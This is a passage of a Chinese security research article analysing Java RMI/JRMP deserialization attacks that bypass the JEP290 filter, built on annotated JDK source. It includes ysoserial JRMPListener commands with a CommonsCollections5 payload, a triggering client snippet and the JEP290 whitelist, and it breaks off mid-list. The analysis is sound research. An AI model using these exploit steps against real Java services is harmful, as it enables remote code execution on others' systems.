字数：1w5
推荐阅读时间：>2h
## 前言
再看下RMI反序列化攻击的总结图：
如果觉得有什么出入，喷就完事了；  
同时觉得本文对你有帮助， ~~也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播开.....~~
咳...在上篇中已经讲述 **针对已知RMI接口的三种攻击方式** 与 **针对RMI层（RMI注册端、RMI服务端）/DGC层** ，得出了部分结论。
而在下篇中将重点讲述 **绕过JEP290的引入JRMP的利用方式**
，这就很好玩了，指出了别的老哥的错误之处，找到了别人没提及的骚姿势，复现分析了老外的绕过方式。
上下篇的小结论是沿用的，建议配合食用；文中实验代码、环境及工具均已上传[github](https://github.com/lalajun/RMIDeserialize)。
此外安利下[ysomap](https://github.com/wh1t3p1g/ysomap)，如果没有意外的话，之后会陆续把这些攻击方式都移植过去。
## 利用JRMP反序列化绕过JEP290
在上篇中我们所有攻击方式都给JEP290给干掉了，当然出了参数利用的方式，但是那种利用局限性太强了。来看看绕过JEP290的攻击方式。
先进行攻击演示：
  1. 使用github中的`ServerandRegister.java`作为受害者靶机
  2. 运行`java -cp F:\BanZ\java\ysoserial.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections5 "calc"`作为攻击者自实现的JRMP服务端
  3. 运行github中的`Bypass290.java`作为攻击代码
再来讲绕过原理的前置知识：
### JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)
> 这其实就是ysoserial.exploit.JRMPListener模块的攻击逻辑
>
>
> 其实之前标题为DGC服务端打DGC客户端，在别的文章评论区如此说的时候，被[老哥](https://www.anquanke.com/post/id/204740#h2-15)指出来不对：这里的漏洞触发跟DGC没关系。
>
>
> 实际去仔细看了调用栈的确不经过DGC，由于自己看的时候是从`sun.rmi.transport.DGCImpl_Stub#dirty`跳转进去的所以就当成DGC层。
>
>
> 实际上应该归为JRMP层，JRMP是DGC和RMI底层通讯层，DGC和RMI的最终调用都回到JRMP这一层来，但是这种理论归属知道个大概就好，其实我也不是很确定QAQ。
我们之前在看DGC层反序列化的时候，下的客户端断点是在`sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)`，然后回退到调用栈的dirty方法中。
    public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException {
            try {
                //开启了一个连接，似曾相识的 669196253586618813L 在服务端也有
                RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);
                try {
                    //获取连接的输入流
                    ObjectOutput var6 = var5.getOutputStream();
                    //***DGC客户端攻击DGC服务端的payload写入处***
                    var6.writeObject(var1);
                    var6.writeLong(var2);
                    var6.writeObject(var4);
                } catch (IOException var20) {
                    throw new MarshalException("error marshalling arguments", var20);
                }
                //进入此处
                super.ref.invoke(var5);
dirty方法中通过`super.ref.invoke(var5);`进入`sun.rmi.server.UnicastRef#invoke`
在这里进行了
  1. 发送了之前处理好的序列化数据包
  2. 处理了服务端的报错返回。而 **反序列化问题正是出现在这里**
`sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)`
    public void invoke(RemoteCall call) throws Exception {
            try {
                //写个日志，不管
                clientRefLog.log(Log.VERBOSE, "execute call");
               //跟进此处
                call.executeCall();
                //...省略一堆报错处理
`sun.rmi.transport.StreamRemoteCall#executeCall`
    public void executeCall() throws Exception {
            byte returnType;
            // read result header
            DGCAckHandler ackHandler = null;
            try {
                //...这里发包和接受返回状态returnType和返回包数据流in
                returnType = in.readByte();  //1. 反序列化一个returnType
                in.readID();        // 2. 反序列化一个id for DGC acknowledgement
                //具体细节比较复杂不看了
            } catch (UnmarshalException e) {
                //..略..
            }
            // 处理returnType返回状态
            switch (returnType) {
            //这是常量1
            case TransportConstants.NormalReturn:
                break;
            //这是常量2
            case TransportConstants.ExceptionalReturn:
                Object ex;
                try {
                    //3. 从服务端返回数据流in中读取，并反序列化
                    //***漏洞触发点***
                    ex = in.readObject();
                    //省略之后代码
JRMP客户端反序列化顺序：
  1. 反序列化服务端给的returnType
  2. 反序列化服务端给的一个ID
  3. 反序列化服务端给的报错信息
> 小问题：为啥一定要利用报错信息写payload，前两个不可以么？
>
> 当然不可以，readObject才行，不懂的话..... 不懂你也看不到这里。。打扰了
>
> 此外自己在看的时候发现了一个自己模糊的问题：JAVA反序列化序列化 是队列形式的还是栈形式的？
>
> 即：out.writeObject(a)；out.writeObject(a)；out.readObejct()的结果是a还是b
>
> 是a，队列形式
那我们知道了JRMP客户端存在一个反序列化点，是可以被攻击，再来看看对应的服务端是在哪里插入payload的（我们已经知道了大概是一个报错信息处）
这里网上的文章大多是直接拿yso
exploit的JRMPlistener攻击代码来看了，那个代码是直接重构了JRMP服务端，把报错信息改成payload的，但是都没有说原生服务端在哪里写序列化。（虽然这个问题对于实际攻击利用没有太大意义，还是来看下）
可以看到上面客户端代码对于服务端传输过来的`returnType`判断为`TransportConstants.ExceptionalReturn`才会进入反序列化流程。那么我们来全局搜索`TransportConstants.ExceptionalReturn`就可以找到服务端在哪里写入的了。
发现服务端的代码就在同个java文件下`sun.rmi.transport.StreamRemoteCall#getResultStream`：
    public ObjectOutput getResultStream(boolean success) throws IOException {
        if (resultStarted)
            throw new StreamCorruptedException("result already in progress");
        else
            resultStarted = true;
        DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
        wr.writeByte(TransportConstants.Return);
        getOutputStream(true);  
        //success为false，进入我们的分支
        if (success)  
            out.writeByte(TransportConstants.NormalReturn);
        else
            //*******这里第一个序列化returnType*******
            out.writeByte(TransportConstants.ExceptionalReturn);
        //第二个序列化一个ID
        out.writeID();          // write id for gcAck
        return out;
    }
这里反序列化了两个前置的参数，这个函数之后就是payload处的写入，全局搜索该函数的引用处（参数要false的）：
前两处在`sun.rmi.server.UnicastServerRef#dispatch`和`sun.rmi.server.UnicastServerRef#oldDispatch`中，但代码一样，写入了报错信息：
    //这里出来
    ObjectOutput out = call.getResultStream(false);
    if (e instanceof Error) {
        e = new ServerError(
            "Error occurred in server thread", (Error) e);
    } else if (e instanceof RemoteException) {
        e = new ServerException(
            "RemoteException occurred in server thread",
            (Exception) e);
    }
    if (suppressStackTraces) {
        clearStackTraces(e);
    }
    //第三处序列化：序列化写入报错信息，也就是payload插入处
    out.writeObject(e);
后一处在`sun.rmi.transport.Transport#serviceCall`中，清空了调用栈，然后写入了报错信息。
    ObjectOutput out = call.getResultStream(false);
    UnicastServerRef.clearStackTraces(e);
    //第三处序列化：序列化写入报错信息，也就是payload插入处
    out.writeObject(e);
    call.releaseOutputStream();
那么 **服务端在三处地方可以写入payload**
去发起对于客户端的请求（其实应该还有更多地方，比如我们下断点找过来的路径就不是这三个的任何一个），找到之后我们就会发现，我们没法去利用原生的payload插入处，去插入payload。因为他们都是写入了报错信息，我们没法去控制。
那么就只有自实现拼接出一个JRMP服务端，来发送给JRMP客户端一个序列化数据，这就是 **YSOSERIAL-exploit-JRMPListener**
做的事情。
但是我们的这里的重点不是研究 **JRMPListener** ，所以不详细说明了
#### 复现
**我们可以通过github里的JRMPClient和ysoserial来复现一下JRMP服务端打客户端的过程。**
起一个JRMP服务端`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099
CommonsCollections5 "calc"`
这个exploit会对任何请求回应一个响应包，其中报错信息被替换成了CC5链的Object payload。
然后客户端运行`JRMPClient.java`
    public class JRMPClient {
        public static void main(String[] args) throws Exception{
            Registry registry = LocateRegistry.getRegistry(1099);
            registry.lookup("hello");
        }
    }
成功，而且非常有趣，我们测试的JDK是在JEP290（8u121）修复之后！
这说明 **JRMP服务端打JRMP客户端的攻击方法不受JEP290的限制！**
**为什么？**
因为之前也说到JEP290默认只为 **RMI注册表** （RMI Register层）和 **RMI分布式垃圾收集器**
（DGC层）提供了相应的内置过滤器，但是最底层的JRMP是没有做过滤器的。所以可以攻击执行payload
那么有没有可能我们把这个可以绕过JEP290的攻击方式与几种之前被白名单拦截的攻击路径结合呢？
### 与RMI服务端反序列化攻击RMI注册端-Bind结合
我们的期待中的攻击流程如下（偷一张老外大佬的图）：
**上面一条线**`registry,bind(name,object)`是我们RMI服务端bind攻击RMI注册端的攻击路线，但是由于JEP290加入了反序列化过滤器，我们的诸多利用链比如CC被白名单限制失效了。具体细节如下：
    数组最大长度maxarray=1000000;
    调用栈最大深度maxdepth=20;
    白名单要求如下：
    java.lang.String;
    java.lang.Number;
    java.lang.reflect.Proxy;
    java.rmi.Remote;
    sun.rmi.server.UnicastRef;
    sun.rmi.server.RMIClientSocketFactory;
    sun.rmi.server.RMIServerSocketFactory;
    java.rmi.activation.ActivationID;
    java.rmi.server.UID
而 **下面两条线** 对应着我们刚才分析的 **JRMP服务端打JRMP客户端** 的过程：
  1. 要RMI注册端作为JRMP客户端去主动连接我们的JRMP服务端（白名单过滤器只对反序列化过程有效，对序列化过程无效）